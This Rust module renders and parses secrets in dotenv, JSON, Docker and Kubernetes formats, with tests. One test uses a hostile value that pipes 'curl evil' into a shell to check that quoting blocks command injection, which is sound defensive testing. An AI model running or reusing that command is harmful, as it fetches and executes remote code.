use std::collections::BTreeMap;
use std::fmt::Write as _;

use zeroize::Zeroizing;

use crate::domain::{SecretKey, SecretValue, Secrets};
use crate::{Error, Result};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Format {
    #[default]
    Env,
    Json,
    Docker,
}

#[derive(Debug, Default)]
pub struct Dotenv {
    pub entries: Vec<(SecretKey, SecretValue)>,
    pub rejected_lines: Vec<usize>,
}

pub fn render(secrets: &Secrets, format: Format) -> Result<Zeroizing<Vec<u8>>> {
    match format {
        Format::Env => Ok(Zeroizing::new(render_env(secrets).as_bytes().to_vec())),
        Format::Json => render_json(secrets),
        Format::Docker => render_docker(secrets),
    }
}

pub fn render_kubernetes(
    secrets: &Secrets,
    name: &str,
    namespace: Option<&str>,
) -> Result<Zeroizing<Vec<u8>>> {
    validate_kubernetes_name(name)?;
    if let Some(namespace) = namespace {
        validate_kubernetes_name(namespace)?;
    }
    let mut manifest = Zeroizing::new(String::new());
    manifest.push_str("apiVersion: v1\nkind: Secret\nmetadata:\n");
    let _ = writeln!(manifest, "  name: {name}");
    if let Some(namespace) = namespace {
        let _ = writeln!(manifest, "  namespace: {namespace}");
    }
    manifest.push_str("type: Opaque\n");
    if secrets.is_empty() {
        manifest.push_str("data: {}\n");
    } else {
        manifest.push_str("data:\n");
        for (key, value) in secrets.iter() {
            let encoded = base64(value.as_bytes());
            let _ = writeln!(manifest, "  {key}: {}", encoded.as_str());
        }
    }
    Ok(Zeroizing::new(manifest.as_bytes().to_vec()))
}

#[must_use]
pub fn parse_dotenv(input: &str) -> Dotenv {
    let mut parsed = Dotenv::default();
    let mut lines = input
        .lines()
        .enumerate()
        .map(|(index, line)| (index + 1, line));
    while let Some((number, line)) = lines.next() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        match parse_assignment(trimmed, &mut lines) {
            Some(entry) => parsed.entries.push(entry),
            None => parsed.rejected_lines.push(number),
        }
    }
    parsed
}

fn render_env(secrets: &Secrets) -> Zeroizing<String> {
    let capacity = secrets
        .iter()
        .map(|(key, value)| key.as_str().len() + 2 * value.len() + 4)
        .sum();
    let mut output = Zeroizing::new(String::with_capacity(capacity));
    for (key, value) in secrets.iter() {
        output.push_str(key.as_str());
        output.push('=');
        if value.contains(['\'', '\n', '\r']) {
            output.push('"');
            for character in value.chars() {
                match character {
                    '\\' => output.push_str("\\\\"),
                    '"' => output.push_str("\\\""),
                    '$' => output.push_str("\\$"),
                    '`' => output.push_str("\\`"),
                    '\n' => output.push_str("\\n"),
                    '\r' => output.push_str("\\r"),
                    '\t' => output.push_str("\\t"),
                    other => output.push(other),
                }
            }
            output.push('"');
        } else {
            output.push('\'');
            output.push_str(value);
            output.push('\'');
        }
        output.push('\n');
    }
    output
}

fn render_docker(secrets: &Secrets) -> Result<Zeroizing<Vec<u8>>> {
    let mut output = Zeroizing::new(String::new());
    for (key, value) in secrets.iter() {
        if value.contains(['\n', '\r']) {
            return Err(Error::InvalidValue(
                "a value contains line breaks, which Docker env files cannot hold",
            ));
        }
        let _ = writeln!(output, "{key}={value}");
    }
    Ok(Zeroizing::new(output.as_bytes().to_vec()))
}

fn validate_kubernetes_name(name: &str) -> Result<()> {
    let edge =
        |byte: Option<&u8>| byte.is_some_and(|b| b.is_ascii_lowercase() || b.is_ascii_digit());
    let valid = !name.is_empty()
        && name.len() <= 253
        && edge(name.as_bytes().first())
        && edge(name.as_bytes().last())
        && name.bytes().all(|byte| {
            byte.is_ascii_lowercase() || byte.is_ascii_digit() || matches!(byte, b'-' | b'.')
        });
    if valid {
        Ok(())
    } else {
        Err(Error::InvalidValue(
            "Kubernetes names use lowercase letters, digits, '-' and '.'",
        ))
    }
}

fn base64(bytes: &[u8]) -> Zeroizing<String> {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut output = Zeroizing::new(String::with_capacity(bytes.len().div_ceil(3) * 4));
    for chunk in bytes.chunks(3) {
        let mut group = [0_u8; 3];
        for (slot, byte) in group.iter_mut().zip(chunk) {
            *slot = *byte;
        }
        let bits = u32::from(group[0]) << 16 | u32::from(group[1]) << 8 | u32::from(group[2]);
        for position in 0..4 {
            if position <= chunk.len() {
                let index = usize::try_from(bits >> (18 - 6 * position) & 0x3F).unwrap_or(0);
                output.push(char::from(ALPHABET.get(index).copied().unwrap_or(b'A')));
            } else {
                output.push('=');
            }
        }
    }
    output
}

fn render_json(secrets: &Secrets) -> Result<Zeroizing<Vec<u8>>> {
    let capacity = 4 + secrets
        .iter()
        .map(|(key, value)| 6 * (key.as_str().len() + value.len()) + 16)
        .sum::<usize>();
    let mut output = Zeroizing::new(Vec::with_capacity(capacity));
    let map: BTreeMap<&str, &str> = secrets
        .iter()
        .map(|(key, value)| (key.as_str(), value))
        .collect();
    serde_json::to_writer_pretty(&mut *output, &map)
        .map_err(|_| Error::InvalidValue("cannot encode secrets as JSON"))?;
    output.push(b'\n');
    Ok(output)
}

fn parse_assignment<'a>(
    line: &'a str,
    rest: &mut impl Iterator<Item = (usize, &'a str)>,
) -> Option<(SecretKey, SecretValue)> {
    let body = line
        .strip_prefix("export")
        .filter(|tail| tail.starts_with([' ', '\t']))
        .map_or(line, str::trim_start);
    let (key, raw_value) = body.split_once('=')?;
    let value = parse_value(raw_value.trim_start(), rest)?;
    let key = key.trim_end().parse().ok()?;
    Some((key, value))
}

fn parse_value<'a>(
    raw: &'a str,
    rest: &mut impl Iterator<Item = (usize, &'a str)>,
) -> Option<SecretValue> {
    let mut characters = raw.chars();
    match characters.next() {
        Some(quote @ ('"' | '\'')) => parse_quoted(characters.as_str(), quote, rest),
        _ => Some(Zeroizing::new(strip_inline_comment(raw).to_owned())),
    }
}

fn parse_quoted<'a>(
    mut segment: &'a str,
    quote: char,
    rest: &mut impl Iterator<Item = (usize, &'a str)>,
) -> Option<SecretValue> {
    let mut value = Zeroizing::new(String::with_capacity(segment.len()));
    loop {
        let mut characters = segment.char_indices();
        while let Some((index, character)) = characters.next() {
            if character == quote {
                let trailing = segment.get(index + 1..)?.trim_start();
                let well_formed = trailing.is_empty() || trailing.starts_with('#');
                return well_formed.then_some(value);
            }
            if character == '\\' && quote == '"' {
                match characters.next() {
                    Some((_, escaped)) => push_unescaped(&mut value, escaped),
                    None => value.push('\\'),
                }
            } else {
                value.push(character);
            }
        }
        value.push('\n');
        segment = rest.next()?.1;
    }
}

fn push_unescaped(value: &mut String, escaped: char) {
    match escaped {
        'n' => value.push('\n'),
        'r' => value.push('\r'),
        't' => value.push('\t'),
        '"' | '\\' | '$' | '`' => value.push(escaped),
        other => {
            value.push('\\');
            value.push(other);
        }
    }
}

fn strip_inline_comment(raw: &str) -> &str {
    raw.char_indices()
        .find(|&(index, character)| {
            character == '#'
                && raw
                    .get(..index)
                    .is_some_and(|before| before.ends_with([' ', '\t']))
        })
        .and_then(|(index, _)| raw.get(..index))
        .unwrap_or(raw)
        .trim_end()
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    fn secrets(entries: &[(&str, &str)]) -> Secrets {
        let mut secrets = Secrets::new();
        for (key, value) in entries {
            secrets
                .insert(key.parse().unwrap(), Zeroizing::new((*value).to_owned()))
                .unwrap();
        }
        secrets
    }

    fn pairs(parsed: &Dotenv) -> Vec<(String, String)> {
        parsed
            .entries
            .iter()
            .map(|(key, value)| (key.to_string(), value.to_string()))
            .collect()
    }

    fn text(bytes: &[u8]) -> &str {
        std::str::from_utf8(bytes).unwrap()
    }

    #[test]
    fn parses_common_dotenv_syntax() {
        let input = "\
# comment

PLAIN=value
SPACED = spaced value
export EXPORTED=1
INLINE=abc # trailing comment
HASH=abc#not-a-comment
EMPTY=
SINGLE='literal \\n $HOME # kept'
DOUBLE=\"line\\nnext \\\"quoted\\\" \\\\ \\$HOME\"
AFTER=\"x\"   # comment
URL=postgres://user:p=ss@host/db
";
        let parsed = parse_dotenv(input);
        assert!(
            parsed.rejected_lines.is_empty(),
            "{:?}",
            parsed.rejected_lines
        );
        assert_eq!(
            pairs(&parsed),
            [
                ("PLAIN", "value"),
                ("SPACED", "spaced value"),
                ("EXPORTED", "1"),
                ("INLINE", "abc"),
                ("HASH", "abc#not-a-comment"),
                ("EMPTY", ""),
                ("SINGLE", "literal \\n $HOME # kept"),
                ("DOUBLE", "line\nnext \"quoted\" \\ $HOME"),
                ("AFTER", "x"),
                ("URL", "postgres://user:p=ss@host/db"),
            ]
            .map(|(key, value)| (key.to_owned(), value.to_owned()))
        );
    }

    #[test]
    fn parses_multiline_quoted_values() {
        let input = "KEY=\"-----BEGIN-----\nabc\n-----END-----\"\nNEXT='a\r\nb'\r\nLAST=1";
        let parsed = parse_dotenv(input);
        assert_eq!(
            pairs(&parsed),
            [
                ("KEY", "-----BEGIN-----\nabc\n-----END-----"),
                ("NEXT", "a\nb"),
                ("LAST", "1"),
            ]
            .map(|(key, value)| (key.to_owned(), value.to_owned()))
        );
    }

    #[test]
    fn reports_rejected_line_numbers() {
        let input =
            "OK=1\nno equals\n1BAD=x\nexport =1\nTRAIL=\"x\" junk\nUNCLOSED=\"abc\nSWALLOWED=2";
        let parsed = parse_dotenv(input);
        assert_eq!(pairs(&parsed), [("OK".to_owned(), "1".to_owned())]);
        assert_eq!(parsed.rejected_lines, [2, 3, 4, 5, 6]);
    }

    #[test]
    fn double_quoted_values_cannot_run_commands_when_sourced() {
        let hostile = "x'$(curl evil|sh) `id` ${HOME} \"q\"\n";
        let rendered = render(&secrets(&[("A", hostile)]), Format::Env).unwrap();
        let line = text(&rendered);
        assert!(line.starts_with("A=\""));
        assert!(!line.replace("\\$", "").contains('$'), "{line}");
        assert!(!line.replace("\\`", "").contains('`'), "{line}");
        let parsed = parse_dotenv(line);
        assert_eq!(pairs(&parsed), [("A".to_owned(), hostile.to_owned())]);
    }

    #[test]
    fn renders_env_with_safe_quoting() {
        let rendered = render(
            &secrets(&[
                ("A", "plain $HOME \"x\""),
                ("B", "it's\nmultiline\\"),
                ("C", ""),
            ]),
            Format::Env,
        )
        .unwrap();
        assert_eq!(
            text(&rendered),
            "A='plain $HOME \"x\"'\nB=\"it's\\nmultiline\\\\\"\nC=''\n"
        );
    }

    #[test]
    fn docker_env_files_are_literal_and_reject_line_breaks() {
        let rendered = render(
            &secrets(&[("B", "it's \"x\" $HOME"), ("A", "1")]),
            Format::Docker,
        )
        .unwrap();
        assert_eq!(text(&rendered), "A=1\nB=it's \"x\" $HOME\n");
        assert!(render(&secrets(&[("A", "line\nbreak")]), Format::Docker).is_err());
    }

    #[test]
    fn base64_matches_rfc_4648_vectors() {
        for (input, expected) in [
            ("", ""),
            ("f", "Zg=="),
            ("fo", "Zm8="),
            ("foo", "Zm9v"),
            ("foob", "Zm9vYg=="),
            ("fooba", "Zm9vYmE="),
            ("foobar", "Zm9vYmFy"),
        ] {
            assert_eq!(base64(input.as_bytes()).as_str(), expected);
        }
        assert_eq!(base64(&[0xFB, 0xFF, 0xBF]).as_str(), "+/+/");
    }

    #[test]
    fn kubernetes_secret_manifest() {
        let manifest = render_kubernetes(
            &secrets(&[("DB_URL", "postgres://x"), ("CERT", "line1\nline2")]),
            "app-prod",
            Some("payments"),
        )
        .unwrap();
        assert_eq!(
            text(&manifest),
            "apiVersion: v1\nkind: Secret\nmetadata:\n  name: app-prod\n  namespace: payments\n\
             type: Opaque\ndata:\n  CERT: bGluZTEKbGluZTI=\n  DB_URL: cG9zdGdyZXM6Ly94\n"
        );
        let empty = render_kubernetes(&Secrets::new(), "x", None).unwrap();
        assert!(text(&empty).ends_with("data: {}\n"));
        for name in ["", "Upper", "-lead", "trail-", "under_score", "a b"] {
            assert!(
                render_kubernetes(&Secrets::new(), name, None).is_err(),
                "{name:?}"
            );
        }
        assert!(render_kubernetes(&Secrets::new(), "ok", Some("Bad")).is_err());
    }

    #[test]
    fn renders_sorted_json() {
        let rendered = render(&secrets(&[("B", "2"), ("A", "q\"\n")]), Format::Json).unwrap();
        let parsed: BTreeMap<String, String> = serde_json::from_slice(&rendered).unwrap();
        assert_eq!(parsed["A"], "q\"\n");
        assert_eq!(parsed["B"], "2");
        assert!(text(&rendered).find("\"A\"") < text(&rendered).find("\"B\""));
        assert!(rendered.ends_with(b"\n"));
    }

    proptest! {
        #[test]
        fn env_rendering_round_trips(
            map in proptest::collection::btree_map("[A-Z_][A-Z0-9_]{0,12}", "[^\u{0}]{0,40}", 0..12)
        ) {
            let mut original = Secrets::new();
            for (key, value) in &map {
                original.insert(key.parse().unwrap(), Zeroizing::new(value.clone())).unwrap();
            }
            let rendered = render(&original, Format::Env).unwrap();
            let parsed = parse_dotenv(text(&rendered));
            prop_assert!(parsed.rejected_lines.is_empty());
            let expected: Vec<(String, String)> = map.into_iter().collect();
            prop_assert_eq!(pairs(&parsed), expected);
        }

        #[test]
        fn parsing_arbitrary_text_never_panics(input in "(?s).{0,300}") {
            let _ = parse_dotenv(&input);
        }
    }
}
